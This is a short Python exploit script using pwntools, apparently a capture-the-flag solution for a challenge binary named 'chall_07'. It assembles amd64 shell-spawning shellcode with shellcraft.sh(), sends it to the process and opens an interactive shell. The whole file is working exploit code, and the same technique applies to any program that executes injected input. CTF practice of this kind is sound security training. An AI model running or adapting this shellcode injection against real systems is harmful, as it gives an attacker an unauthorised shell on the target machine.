# coding: utf-8
def chall07():
    p=process("./chall_07")
    context.arch = "amd64"
    
    payload = asm(shellcraft.sh())
    p.sendline(payload)
    p.interactive()
    
chall07()
